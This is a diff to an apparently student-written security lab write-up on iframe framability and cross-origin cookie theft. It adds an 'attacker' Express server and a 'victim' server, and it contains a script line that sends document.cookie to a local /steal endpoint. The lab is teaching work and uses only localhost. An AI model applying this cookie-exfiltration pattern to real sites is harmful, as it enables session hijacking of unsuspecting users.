@@ -208,7 +208,7 @@ In order to report these, I have added a column name "toplevel: isframable" to t
 ```
 ** A constant isLoaded is defined which will get the window length from the contentWindow property (contentWindow returns the Window object of an HTMLIFrameElement). If the frame is loaded, isLoaded will be greater than 0 and if it's not loaded, it will be equal to zero.   
 
-```
+```javascript
 function frameLoaded() 
 {
 
@@ -235,7 +235,7 @@ else if (isLoaded >= 1)
 
 ** Finally, I am using selenium to open each HTML hosted locally to collect the alert text along with any error the browser might through while trying to load the Iframe.
 
-```
+```python
 response = driver.get(localhost_url)
 driver.implicitly_wait(30)
 alerttext = driver.switch_to.alert
@@ -279,7 +279,7 @@ if "Iframe not loaded" in outcome:
 
 * HTML
 
-```html
+```diff
 $ cat files/html/stolencookie.html 
 <html>
 <title>
@@ -307,7 +307,7 @@ The iframe cookie can be displayed outside of iframe. Wait for 5 seconds and you
     // wait 5 seconds
     setTimeout(function() {
     const p = document.createElement('p')
-    p.innerHTML = document.cookie   /*iframe.contentDocument.cookie */
+-   p.innerHTML = document.cookie   /*iframe.contentDocument.cookie */
     document.body.appendChild(p)
 
     new Image().src = 'http://localhost:5002/steal?cookie=' + document.cookie  /*iframe.contentDocument.cookie*/
@@ -315,6 +315,42 @@ The iframe cookie can be displayed outside of iframe. Wait for 5 seconds and you
 </script>
 
 ```
+
+```javascript
+$ cat evil_server.js 
+const express = require('express')
+const { createReadStream } = require('fs')
+const app = express()
+const port = 5001
+
+app.get('/', (req, res) => {
+  createReadStream('files/html/stolencookie.html').pipe(res)
+})
+
+app.listen(port, () => {
+  console.log(`Server 1: Attacker is listening at http://localhost:${port}`)
+})
+
+app.use(express.static('files'))
+```
+
+```javascript
+$ cat victim.js 
+const express = require('express')
+const { createReadStream } = require('fs')
+const app = express()
+const port = 5002
+
+app.get('/', (req, res) => {
+  res.append('Set-Cookie', 'login=secretcookie; Path=/')
+  res.send("<html><title>Himarsha's Victim Page</title><h1>Welcome to my vulnerable victim page!<br></h1>Himarsha Jayanetti, CS595 - Spring 2021, ODU<br><br>This page will be framed at a cross origin domain.<script>document.write(document.cookie)</script></html>")
+})
+
+app.listen(port, () => {
+  console.log(`Server 2: Vulnerable victim is listening at http://localhost:${port}`)
+})
+```
+
 
 ### Unsuccesful Attack
 
